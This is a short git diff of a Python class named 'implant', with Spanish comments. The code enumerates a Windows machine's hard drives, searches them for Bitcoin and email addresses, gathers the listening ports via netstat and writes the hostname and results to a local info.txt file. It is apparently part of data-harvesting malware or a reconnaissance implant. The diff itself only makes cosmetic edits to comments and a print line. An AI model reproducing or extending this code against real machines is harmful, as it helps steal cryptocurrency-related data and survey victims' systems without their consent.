@@ -37,11 +37,9 @@ class implant():
 
             # Obtener los discos duros
         disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
-        print(disks)
             # Imprimir el nombre de cada disco duro encontrado
 
 
-            # search for bitcoin and email addresses
 
         def buscar_direcciones(texto):
             # Patron para buscar direcciones de Bitcoin
@@ -94,7 +92,7 @@ class implant():
         for i in disks:
             buscar_en_ruta(i)
         buscar_en_ruta(ruta_a_buscar)
-        # get all open ports on the machine
+        # pilla los puertos abiertos y mete los datos al archvio info
         open_ports = os.popen('netstat -an | findstr /R /C:"LISTENING" | findstr /R /C:"[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*').read()
         f = open("info.txt", "w")
         f.write("El hostname es " + hostname + "\n")
